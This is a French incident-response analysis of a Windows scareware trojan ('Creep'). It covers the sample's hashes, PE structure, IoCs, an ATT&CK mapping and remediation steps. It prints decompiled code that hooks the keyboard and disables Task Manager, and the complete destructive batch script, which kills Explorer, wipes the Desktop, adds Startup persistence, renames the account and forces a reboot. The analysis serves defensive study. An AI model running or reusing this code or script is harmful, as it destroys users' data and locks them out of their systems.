# Trojan.Win32.Diztakun.arpg (« Creep ») — Analyse détaillée

Langue : Français | English version: [README_EN.md](README_EN.md)

**Sample (fichier local) :** `000.exe.bin`  
**Famille AV :** Kaspersky `Trojan.Win32.Diztakun` — scareware / jokeware destructif  
**Nom interne (code) :** `Creep` (WPF .NET 4)  
**Sources :** PE .NET + décompil `ilspycmd` (`analysis/decompiled/`) + artefacts extraits  
**Any.RUN :** non fourni  

> Analyse **défensive / IR**. Le sample n’a **pas** été exécuté sur l’hôte.

### En une phrase (non expert)

Ce n’est **pas** un ransomware qui chiffre et demande Bitcoin. C’est un **théâtre d’horreur système** : il bloque les touches pour s’échapper, tue le bureau Windows, pollue l’écran de messages « UR NEXT », force un reboot, puis au prochain login spamme des boîtes de dialogue « run away » jusqu’à rendre la machine inutilisable.

| Ce que ce n’est **pas** | Ce que c’est |
|-------------------------|--------------|
| Chiffrement de fichiers / note de rançon crypto | Scareware destructif (panique + sabotage UI) |
| Stealer / C2 / vol de mots de passe | Aucun indicateur réseau dans le parent ni les drops |
| WannaCry / Conti / Spora | WPF admin + batch + petit payload MessageBox |

---
## 0. Synthèse — chaîne d’impact

| Élément | Détail |
|--------|--------|
| Fichier | `000.exe.bin` |
| Type | PE32 GUI, assembly **Mono/.NET** (`v4.0.30319`), WPF |
| Compilation (PE TimeDateStamp) | `2016-09-22 13:02:11 UTC` |
| Namespaces / types | `Creep.App`, `Creep.MainWindow`, `Utilities.GlobalKeyboardHook` |
| UAC | Manifest `requireAdministrator` |
| Comportement | Hook clavier global → blocage touches système ; désactivation Task Manager ; kill Explorer via `.bat` ; spam Desktop « UR NEXT » ; persistance Startup `rniw.exe` ; boucle MessageBox « run away » ; vidéo plein écran en boucle ; reboot forcé |
| Réseau | **Aucun** indicateur HTTP/FTP/SMTP/onion dans le parent ni les drops |

Chaîne d’impact (statique) :

```
000.exe (Creep / WPF, admin)
  ├─ GlobalKeyboardHook (bloque Esc, Win, Tab, Del)
  ├─ Registre : DisableTaskMgr, AutoRestartShell=0, wallpaper vide, icône .txt
  ├─ Drop %TEMP% : icon.ico, text.txt, windl.bat, one.rtf, rniw.exe, v.mp4
  └─ Process.Start(windl.bat)
        ├─ taskkill explorer.exe / taskmgr.exe
        ├─ copy rniw.exe → ProgramData\...\Startup\
        ├─ rename compte utilisateur → "UR NEXT"
        ├─ wipe Desktop + spam .txt / note RTF
        ├─ tentative del WindowsApps
        └─ shutdown /f /r /t 0
              └─ (au login suivant) rniw.exe → charge Messager.exe
                    └─ MessageBox.Show("run away") en boucle infinie
```


**Pourquoi ça fait peur efficacement :** chaque couche coupe une sortie (Esc/Win/TaskMgr/Explorer), pendant qu’une vidéo boucle et qu’un script invisible détruit le bureau. La « rançon » est psychologique — il n’y a **rien à payer** pour récupérer des fichiers chiffrés, parce qu’il n’y a **pas** de chiffrement.


---

## 1. Identification du sample

### 1.1 Hashes — `000.exe.bin`

| Algo | Valeur |
|------|--------|
| MD5 | `f2b7074e1543720a9a98fda660e02688` |
| SHA1 | `1029492c1a12789d8af78d54adcb921e24b9e5ca` |
| SHA256 | `4ea1f2ecf7eb12896f2cbf8683dae8546d2b8dc43cf7710d68ce99e127c0a966` |
| Taille | 6 983 680 octets (6,7 MiB) |

### 1.2 En-tête PE

| Champ | Valeur |
|-------|--------|
| Machine | `0x14C` (i386) |
| Sections | 3 (`.text`, `.rsrc`, `.reloc`) |
| Subsystem | 2 (WINDOWS_GUI) |
| ImageBase | `0x400000` |
| EntryPoint RVA | `0x6A9A8E` (stub `_CorExeMain`) |
| Overlay | 0 |
| Import unique | `mscoree.dll!_CorExeMain` |

| Section | VSize | RawSize | Entropie | Note |
|---------|------:|--------:|---------:|------|
| `.text` | 6 978 196 | 6 978 560 | **~0,75** | Faible : IL + **~6,6 MiB de ressources managées** (beaucoup de zéros / média) |
| `.rsrc` | 4 056 | 4 096 | ~5,03 | Version + manifest natif |
| `.reloc` | 12 | 512 | ~0,10 | |

### 1.3 CLR / assembly

| Champ | Valeur |
|-------|--------|
| Runtime | `v4.0.30319` |
| Flags | `0x20003` (ILONLY + 32BITREQUIRED) |
| EntryPoint token | `0x6000012` → `Creep.App.Main` |
| Assembly Name | `000` version `0.0.0.0` |
| Module | `000.exe` |
| Resources managées | RVA `0x454C`, taille **6 968 248** |

**AssemblyRef :** `mscorlib`, `PresentationFramework`, `PresentationCore`, `System.Xaml`, `System`, `System.Windows.Forms`.

**Version info PE :** `FileDescription=000`, `OriginalFilename=000.exe`, versions `0.0.0.0`, Company/Copyright vides.

**PDB / auteur (drop secondaire) :** dans `Messager.exe` embarqué :  
`C:\Users\FlyTech\Documents\Visual Studio 2015\Projects\Messager\Messager\obj\Debug\Messager.pdb`

---

## 2. Point d’entrée

### À quoi ça sert ? (non expert)

Au démarrage, l’appli WPF ne montre **pas** d’abord une jolie fenêtre : elle pose un **filet** (hook clavier) et lance le sabotage (`WorkWorkWorkWork`) **avant** même de charger l’interface et la vidéo. Objectif : que Esc / touche Windows / Suppr ne servent déjà plus quand l’utilisateur panique.


`Creep.App.Main` (STAThread) instancie l’application WPF et ouvre `MainWindow.xaml`.

```csharp
[STAThread]
public static void Main()
{
    App app = new App();
    app.InitializeComponent();   // StartupUri = MainWindow.xaml
    ((Application)app).Run();
}
```

Le constructeur de `MainWindow` enchaîne immédiatement le hook clavier et la routine d’impact `WorkWorkWorkWork()` **avant** même `InitializeComponent()` (donc avant l’affichage / la vidéo).

```csharp
public MainWindow()
{
    Console.WriteLine("beginning!");
    gkh = new GlobalKeyboardHook();
    gkh.HookedKeys.Add((Keys)27);  // Escape
    gkh.HookedKeys.Add((Keys)91);  // LWin
    gkh.HookedKeys.Add((Keys)92);  // RWin
    gkh.HookedKeys.Add((Keys)9);   // Tab
    gkh.HookedKeys.Add((Keys)46);  // Delete
    gkh.KeyDown += new KeyEventHandler(handleKey);
    gkh.hook();
    WorkWorkWorkWork();            // drops + registre + bat
    InitializeComponent();         // UI + MediaElement
}
```

**Pourquoi cet ordre :** bloquer les touches de sortie et saboter le shell **avant** que la fenêtre « creepy » / la vidéo n’apparaisse, pour maximiser le panique et empêcher Task Manager / menu Démarrer.

---

## 3. Init — hook clavier, registre, drops

### À quoi ça sert ? (non expert)

Trois gestes en parallèle :

1. **Couper les sorties** (touches système + Task Manager + anti-respawn d’Explorer)  
2. **Déposer les outils** dans `%TEMP%` (batch, icône, note, vidéo, payload Startup)  
3. **Lancer le batch en silence** — c’est lui qui fait le gros dégât visible (bureau, reboot)


### 3.1 `Utilities.GlobalKeyboardHook` (WH_KEYBOARD_LL)

P/Invoke `user32` : `SetWindowsHookEx(13, …)` (`WH_KEYBOARD_LL`), `CallNextHookEx`, `UnhookWindowsHookEx` ; `kernel32!LoadLibrary("User32")` comme `hInstance`.

Pour chaque touche listée dans `HookedKeys`, si `KeyDown` marque `Handled=true`, le hook retourne `1` (événement **avalé**, non propagé).

```csharp
private void handleKey(object sender, KeyEventArgs e)
{
    e.Handled = true;   // consomme Esc / Win / Tab / Del au niveau système
}
```

En plus, `main_PreviewKeyDown` sur la fenêtre WPF marque **toutes** les touches `Handled` dans le contexte UI (couche redondante pendant que la fenêtre a le focus).

### 3.2 `WorkWorkWorkWork()` — sabotage registre + écriture TEMP

```csharp
public void WorkWorkWorkWork()
{
    string tempPath = Path.GetTempPath();
    File.WriteAllBytes(tempPath + "icon.ico", Resources.texticon);

    // Icône par défaut des .txt → icône embarquée (souvent « creepy »)
    RegistryKey registryKey = Registry.ClassesRoot.CreateSubKey("txtfile\\DefaultIcon");
    registryKey.SetValue("", tempPath + "icon.ico");
    registryKey.Close();

    // Efface le chemin wallpaper (fond « cassé » / noir selon shell)
    registryKey = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
    registryKey.SetValue("Wallpaper", "");
    registryKey.Close();

    // Désactive le Gestionnaire des tâches (politique utilisateur)
    registryKey = Registry.CurrentUser.CreateSubKey(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    registryKey.SetValue("DisableTaskMgr", "1");
    registryKey.Close();

    // Empêche le redémarrage auto d’explorer.exe après kill
    registryKey = Registry.LocalMachine.CreateSubKey(
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
    registryKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
    registryKey.Close();

    File.WriteAllBytes(tempPath + "text.txt", Resources.txt);
    File.WriteAllBytes(tempPath + "windl.bat", Resources.windl);
    File.WriteAllBytes(tempPath + "one.rtf", Resources.one);
    File.WriteAllBytes(tempPath + "rniw.exe", Resources.subox);

    ProcessStartInfo processStartInfo = new ProcessStartInfo(tempPath + "windl.bat");
    processStartInfo.CreateNoWindow = true;
    processStartInfo.UseShellExecute = false;
    Process.Start(processStartInfo);
}
```

| Clé / valeur | Effet |
|--------------|--------|
| `HKCR\txtfile\DefaultIcon` = `%TEMP%\icon.ico` | Tous les `.txt` affichent l’icône malware |
| `HKCU\Control Panel\Desktop\Wallpaper` = `""` | Wallpaper vidé |
| `HKCU\...\Policies\System\DisableTaskMgr` = `1` | Ctrl+Shift+Esc / TaskMgr bloqués |
| `HKLM\...\Winlogon\AutoRestartShell` = `0` | Explorer ne respawn pas après `taskkill` |

Les écritures `HKCR` / `HKLM` expliquent le **`requireAdministrator`** du manifest.

### 3.3 Ressources managées (`Creep.Properties.Resources`)

| Nom ressource | Drop runtime | Taille | SHA256 (extrait) | Type |
|---------------|--------------|-------:|------------------|------|
| `texticon` | `%TEMP%\icon.ico` | 370 070 | `84a1c2713642090523f05d9fb015c537fd210d3200cadaf442bb67cf1834b356` | Icône ICO (6 images) |
| `txt` | `%TEMP%\text.txt` | 396 | `38c889b5d7bdcb79bbcb55554c520a9ce74b5bfc29c19d1e4cb1419176c99f48` | Texte « UR NEXT » × N |
| `windl` | `%TEMP%\windl.bat` | 771 | `b551fba71dfd526d4916ae277d8686d83fff36d22fcf6f18457924a070b30ef7` | Batch destructeur |
| `one` | `%TEMP%\one.rtf` | 403 | `e152b106733d9263d3cf175f0b6197880d70acb753f8bde8035a3e4865b31690` | Note scare RTF |
| `subox` | `%TEMP%\rniw.exe` | 78 336 | `70faa0e1498461731f873d3594f20cbf2beaa6f123a06b66f9df59a9cdf862be` | PE PureBasic + payload |
| `street` | `%TEMP%\v.mp4` | 83 233 | `95374cf300097872a546d89306374e7cf2676f7a8b4c70274245d2dccfc79443` | MP4 (boucle UI) |
| `_000` | *(non référencé par MainWindow)* | 6 433 222 | `f8f30ec1b5ad0e3af77abb783c7ce9e1333c95d34ebfd7323009f21c9152b04c` | Uniquement octets `0x30` (`'0'`) — **padding / leurre**, jamais droppé |

Ré-extraction : `python3 extract_resources.py` ( lit le `.resx` produit par `ilspycmd` ).

---

## 4. Vidéo / UI WPF

### À quoi ça sert ? (non expert)

Pendant que le batch travaille en coulisse, la fenêtre WPF joue une vidéo en **boucle** (`v.mp4`) pour occuper l’écran et renforcer le sentiment d’être « piégé » — alors que Esc / Win / Del sont déjà morts.


Au `Loaded` du `MediaElement` :

```csharp
private void video_Loaded(object sender, RoutedEventArgs e)
{
    string text = Path.GetTempPath() + "v.mp4";
    File.WriteAllBytes(text, Resources.street);
    video.set_Source(new Uri(text));
}

private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
{
    // Relance quasi immédiate → boucle infinie
    val.set_Position(TimeSpan.FromMilliseconds(1.0));
}
```

Objectif : maintenir un média « creepy » au premier plan pendant que le batch détruit le bureau et que les touches de sortie sont mortes.

---

## 5. Script reconstruit — `windl.bat`

### À quoi ça sert ? (non expert)

Le PE WPF est le **metteur en scène** ; `windl.bat` est l’**équipe technique**. Une fois lancé sans fenêtre, il tue le shell, pose la persistance, renomme le compte en `UR NEXT`, rase le bureau, spamme des `.txt`, tente de casser `WindowsApps`, puis **redémarre immédiatement**. Après le reboot, ce n’est plus Creep qui harcèle — c’est `rniw.exe` → Messager.


Fichier livré : [`windl.bat`](windl.bat) / [`artefacts/windl.bat`](artefacts/windl.bat).

```bat
@echo off
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
copy %temp%\rniw.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\rniw.exe"
wmic useraccount where name='%username%' set FullName='UR NEXT'
wmic useraccount where name='%username%' rename 'UR NEXT'
SET /a cr=0

del /f /s /q %userprofile%\Desktop\*
for /d %%p in (%userprofile%\Desktop\*) Do rd /Q /S "%%p"

:l
copy %temp%\text.txt "%userprofile%\Desktop\UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR N%cr%XT.txt"
SET /a cr=%cr%+1
if %cr%==28 copy %temp%\one.rtf %userprofile%\Desktop\OPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENME.rtf
if not %cr%==400 goto l

del /f /s /q "C:\Program Files\WindowsApps\"
shutdown /f /r /t 0
```

| Étape | Action | Impact IR |
|-------|--------|-----------|
| 1–2 | `taskkill` explorer / taskmgr | Desktop mort ; TaskMgr déjà aussi bloqué par registre |
| 3 | Copy `rniw.exe` → Startup **all-users** (`ProgramData`) | Persistance au prochain logon |
| 4–5 | `wmic` rename + FullName `UR NEXT` | Compte utilisateur renommé (bruyant, visible) |
| 6–7 | Wipe récursif du Desktop | Perte données bureau |
| 8–11 | Boucle 400 copies `.txt` + RTF à `cr==28` | Spam visuel + note |
| 12 | `del` `WindowsApps` | Tentative de casse Store/UWP (souvent partial selon ACL) |
| 13 | `shutdown /f /r /t 0` | Reboot immédiat forcé |

---

## 6. Note de rançon / scare text

Pas de demande de paiement. Contenu psychologique uniquement.

**`one.rtf` (extrait) :**

```
YOU ARE THE NEXT
I CAN SEE YOU
NOW ITS TOO LATE
I GOT YOU.......
YOU HAVE BEEN WARNED
DONT LOOK BEHIND YOU
```

**`text.txt` :** lignes répétées `UR NEXT`.

---

## 7. Payload de persistance — `rniw.exe` + `Messager.exe`

### À quoi ça sert ? (non expert)

Creep ne reste pas forcément après le reboot. Il laisse un **rapporteur** dans le Startup tous-utilisateurs : `rniw.exe` (hôte PureBasic) qui embarque `Messager.exe` (.NET). Au login suivant, Messager ouvre en boucle une MessageBox « run away » — même si la fenêtre WPF a été fermée avant le reboot.


### 7.1 `rniw.exe` (drop `Resources.subox`)

| Champ | Valeur |
|-------|--------|
| SHA256 | `70faa0e1498461731f873d3594f20cbf2beaa6f123a06b66f9df59a9cdf862be` |
| MD5 | `9232120b6ff11d48a90069b25aa30abc` |
| Type | PE32 natif GUI, **pas** CLR (COM descriptor vide) |
| TimeDateStamp | `2016-05-27 14:05:04 UTC` |
| Indices | sections `.code` / strings `PB_WindowID`, `PB_Hotkey` → **runtime PureBasic** |
| Rôle observé (statique) | Hôte qui embarque un PE .NET dans `RT_RCDATA` |

Ressource `10 / A2958E591A23B5144A3A5437FF2F9274` = PE .NET **8192 octets** extrait sous `analysis/extracted/Messager.exe`.

> Le chemin d’extraction/exécution exact du host PureBasic n’a **pas** été dynamiquement tracé (pas d’exec locale). Le placement dans Startup + la présence du payload Messager rendent l’intention claire : harcèlement UI post-reboot.

### 7.2 `Messager.exe` (embarqué)

| Champ | Valeur |
|-------|--------|
| SHA256 | `dc6ee4edbbbe1116a200b928f2b62dbc55594a9f79152bbb0076161a58546c11` |
| Framework | .NET 4.5.2 |
| PDB | `...\FlyTech\...\Messager\Messager.pdb` |

```csharp
private static void Main()
{
    MessageBoxManager.OK = "run away";
    MessageBoxManager.Register();   // WH_CALLWNDPROCRET — relabel boutons MB
    while (true)
    {
        MessageBox.Show("run away", "run away",
            MessageBoxButtons.OK, MessageBoxIcon.Error);
    }
}
```

`MessageBoxManager` (namespace contrefait `System.Windows.Forms`) installe un hook `WH_CALLWNDPROCRET`, détecte les dialogues `#32770`, et force le texte des boutons (ici OK → `"run away"`). La boucle `while(true)` **spam** des MessageBox erreur : machine quasiment inutilisable jusqu’à kill process / safe mode.

---

## 8. Cleanup / anti-recovery

| Technique | Où |
|-----------|-----|
| Désactiver TaskMgr | Registre HKCU Policies |
| Empêcher respawn Explorer | `AutoRestartShell=0` |
| Kill Explorer + TaskMgr | `windl.bat` |
| Wipe Desktop | `windl.bat` |
| Tentative wipe `WindowsApps` | `windl.bat` |
| Reboot forcé | `shutdown /f /r /t 0` |
| Persistance Startup | `rniw.exe` |
| Blocage touches Esc/Win/Tab/Del | `GlobalKeyboardHook` |

Pas de suppression de logs événements, pas de VSS, pas de chiffrement disque.

---

## 9. Timeline logique (statique)

1. Lancement admin de `000.exe`
2. Hook LL clavier + swallow touches
3. Écriture registre + drops `%TEMP%`
4. Lancement caché `windl.bat`
5. UI WPF charge / boucle `v.mp4`
6. Batch : kill shell, Startup, rename user, spam Desktop, reboot
7. Post-reboot : `rniw.exe` (Startup) → Messager → MessageBox « run away » infini

---

## 10. IoCs

### 10.1 Fichiers

| Path / nom | SHA256 |
|------------|--------|
| `000.exe` / `000.exe.bin` | `4ea1f2ecf7eb12896f2cbf8683dae8546d2b8dc43cf7710d68ce99e127c0a966` |
| `%TEMP%\rniw.exe` / Startup `rniw.exe` | `70faa0e1498461731f873d3594f20cbf2beaa6f123a06b66f9df59a9cdf862be` |
| `Messager.exe` (ressource) | `dc6ee4edbbbe1116a200b928f2b62dbc55594a9f79152bbb0076161a58546c11` |
| `%TEMP%\windl.bat` | `b551fba71dfd526d4916ae277d8686d83fff36d22fcf6f18457924a070b30ef7` |
| `%TEMP%\v.mp4` | `95374cf300097872a546d89306374e7cf2676f7a8b4c70274245d2dccfc79443` |
| `%TEMP%\icon.ico` | `84a1c2713642090523f05d9fb015c537fd210d3200cadaf442bb67cf1834b356` |
| `%TEMP%\one.rtf` | `e152b106733d9263d3cf175f0b6197880d70acb753f8bde8035a3e4865b31690` |
| `%TEMP%\text.txt` | `38c889b5d7bdcb79bbcb55554c520a9ce74b5bfc29c19d1e4cb1419176c99f48` |

### 10.2 Chemins / noms

- `%TEMP%\icon.ico`, `text.txt`, `windl.bat`, `one.rtf`, `rniw.exe`, `v.mp4`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\rniw.exe`
- Desktop : `UR NEXT UR NEXT ... UR N{n}XT.txt` (n = 0..399)
- Desktop : `OPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENME.rtf`
- Compte utilisateur renommé : `UR NEXT`

### 10.3 Registre

- `HKCR\txtfile\DefaultIcon` → `%TEMP%\icon.ico`
- `HKCU\Control Panel\Desktop\Wallpaper` → `""`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr` → `1`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoRestartShell` → `0`

### 10.4 Process / cmdline

- `taskkill /f /im explorer.exe`
- `taskkill /f /im taskmgr.exe`
- `wmic useraccount where name='%username%' set FullName='UR NEXT'`
- `wmic useraccount where name='%username%' rename 'UR NEXT'`
- `shutdown /f /r /t 0`
- MessageBox titre/texte : `run away`

### 10.5 Réseau

Aucun.

---

## 11. ATT&CK (mapping défensif)

| ID | Technique | Observation |
|----|-----------|-------------|
| T1548.002* | Elevation (contexte) | Manifest `requireAdministrator` — **demande** UAC, pas un bypass (*ID listé pour elevation admin ; pas T1548.002 « bypass » strict*) |
| T1547.001 | Registry Run Keys / Startup Folder | `rniw.exe` copié dans Startup `ProgramData` |
| T1112 | Modify Registry | TaskMgr, Winlogon, Wallpaper, DefaultIcon |
| T1056.001 | Input Capture (hook) | `WH_KEYBOARD_LL` — ici pour **bloquer**, pas logger |
| T1055 | Process / UI hook | `WH_CALLWNDPROCRET` dans Messager (MessageBox) |
| T1059.003 | Windows Command Shell | `windl.bat` |
| T1047 | WMI | `wmic useraccount` rename |
| T1489 | Service Stop (approx.) | Kill Explorer / TaskMgr |
| T1529 | System Shutdown/Reboot | `shutdown /f /r /t 0` |
| T1485 | Data Destruction | Wipe Desktop + tentative `WindowsApps` |
| T1491.001 | Defacement interne | Spam « UR NEXT », wallpaper, icônes, MessageBox |

---

## 12. Remédiation IR (indicative)

### À quoi ça sert ? (non expert)

Ici on ne « déchiffre » rien. On **retire la persistance**, on **répare les réglages** que Creep a cassés, et on **nettoie le spam**. Travailler de préférence hors session infectée (mode sans échec / disque externe), parce que Messager peut rendre le bureau inutilisable.


1. Démarrer en mode sans échec / support externe ; **ne pas** se contenter de fermer la MessageBox.
2. Supprimer `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\rniw.exe` et tout `rniw.exe` / `000.exe` restant.
3. Restaurer `AutoRestartShell=1`, supprimer `DisableTaskMgr`, rétablir Wallpaper / `txtfile\DefaultIcon`.
4. Renommer le compte utilisateur si encore `UR NEXT`.
5. Nettoyer `%TEMP%` (`windl.bat`, `v.mp4`, `icon.ico`, …) et le spam Desktop.
6. Vérifier intégrité `WindowsApps` / Store si le `del` a partiellement réussi.
7. Scan AV complet ; rotation mots de passe si l’utilisateur a paniqué et saisi des secrets pendant l’attaque (même sans stealer dans **ce** sample).

---

## 13. Limites de l’analyse

- **Pas d’exécution** locale ni sandbox Any.RUN fournie → pas de process tree runtime, pas de screenshot dynamique.
- Le host PureBasic `rniw.exe` n’a pas été déroulé dynamiquement ; le payload `Messager.exe` est confirmé par extraction ressource + décompilation.
- La ressource `_000` (6,4 MiB de `'0'`) n’est pas utilisée par le code décompilé de `MainWindow`.
- Contenu exact de la vidéo `v.mp4` / de l’icône non décrit (fichiers conservés sous `analysis/extracted/` pour revue manuelle).

---

## 14. Artefacts & livrables

### 14.1 Kit IR compact — `artefacts/` (~112 Ko)

Copies utiles **sans** ouvrir tout `analysis/`. Ce sont des **malware** : ne pas les lancer sur l’hôte.

| Fichier | SHA256 (abrégé) | Rôle |
|---------|-----------------|------|
| [`windl.bat`](artefacts/windl.bat) | `b551fba7…0b30ef7` | Batch destructeur |
| [`text.txt`](artefacts/text.txt) | `38c889b5…c99f48` | Matrice spam « UR NEXT » |
| [`one.rtf`](artefacts/one.rtf) | `e152b106…b31690` | Note d’intimidation |
| [`rniw.exe`](artefacts/rniw.exe) | `70faa0e1…cdf862be` | Persisté Startup (PureBasic) |
| [`Messager.exe`](artefacts/Messager.exe) | `dc6ee4ed…8546c11` | Payload MessageBox (extrait de `rniw`) |
| [`MainWindow.cs`](artefacts/MainWindow.cs) | `edc351f4…c2ab414` | Décompil cœur Creep |

Détail des hashes complets : §10. Contenu fonctionnel déjà décrit en §5–§7.

### 14.2 Où trouver le reste

| Élément | Emplacement | Note |
|---------|-------------|------|
| Sample | `000.exe.bin` (racine) | ~6,7 Mo |
| Décompil Creep | `analysis/decompiled/` | `ilspycmd` |
| Décompil Messager | `analysis/decompiled_messager/` | |
| Drops décodés (`v.mp4`, `icon.ico`, …) | `analysis/extracted/` | Média / icône pour revue manuelle |
| Padding `_000` (6,4 Mo de `'0'`) | `analysis/extracted/` | **Jamais** droppé par `MainWindow` |
| Ré-extraction | [`extract_resources.py`](extract_resources.py) | Depuis le `.resx` ILSpy |

### 14.3 Fichiers produits (ce dossier)

| Fichier | Rôle |
|---------|------|
| `README.md` / `README_EN.md` | Rapports FR / EN |
| `000.exe.bin` | Sample |
| `windl.bat`, `one.rtf`, `text.txt` | Doublons racine des artefacts texte |
| `artefacts/` | Kit IR |
| `analysis/` | Décompil + extraction complète |

---

*Analyse défensive / IR — ne pas exécuter le malware hors sandbox contrôlée.*
